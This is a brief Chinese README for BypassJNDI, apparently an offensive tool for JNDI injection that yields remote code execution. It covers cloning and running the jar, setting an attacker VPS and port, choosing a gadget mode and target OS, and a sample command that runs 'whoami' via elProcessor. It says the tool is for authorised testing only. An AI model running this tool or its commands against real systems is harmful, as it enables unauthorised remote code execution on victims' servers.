# BypassJNDI

### 注意事项

```
1. 使用过程中的 bug 和优化建议欢迎提 issue
2. 配置好 java 环境变量, jdk8+
3. 程序仅作为安全研究和授权测试使用, 开发人员对因误用和滥用该程序造成的一切损害概不负责
```

### 下载安装

```bash
git clone --depth=1 --branch=master https://www.github.com/coolboy0816/BypassJNDI.git
cd BypassJNDI/
java -jar BypassJNDI.jar
```

### 使用效果
![image](https://user-images.githubusercontent.com/30894096/163807285-fe9d467d-78df-4f0e-a5b4-e3015de30d24.png)

### 使用方法
#### 0x00: 指定vps url和开放端口，建议云上主机开启全部端口
#### 0x01: 指定对应model，根据需求选择
#### 0x02: 指定对应目标系统
#### 0x03: 指定对应执行命令（URLClassloader RCE模式下输入vps与classpath）


### 使用截图
```bash
java -jar BypassJndi.jar 192.168.0.58 1099 elProcessor windows whoami
```
![image](https://user-images.githubusercontent.com/30894096/163810335-e0e9f6f5-15f7-4a13-9b64-0e3fd222033d.png)


